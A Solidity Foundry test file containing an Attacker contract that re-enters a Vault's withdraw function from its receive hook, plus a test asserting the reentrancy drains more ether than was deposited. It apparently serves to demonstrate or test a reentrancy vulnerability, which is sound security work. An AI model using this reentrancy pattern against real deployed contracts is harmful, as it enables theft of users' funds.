// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

contract Attacker {
    Vault private immutable vault;
    constructor(Vault v) { vault = v; }
    receive() external payable {
        if (address(vault).balance >= 1 ether) vault.withdraw();
    }
}

contract VaultTest is Test {
    Vault vault;

    function setUp() public { vault = new Vault(); }

    function test_reentrancy_drains_vault() public {
        vault.deposit{value: 1 ether}();
        Attacker attacker = new Attacker(vault);
        // prime the attack: attacker needs a deposit to start the drain
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        vault.deposit{value: 1 ether}();
        vm.prank(address(attacker));
        vault.withdraw();
        assertGt(address(attacker).balance, 1 ether, "reentrancy must drain more than deposited");
    }
}
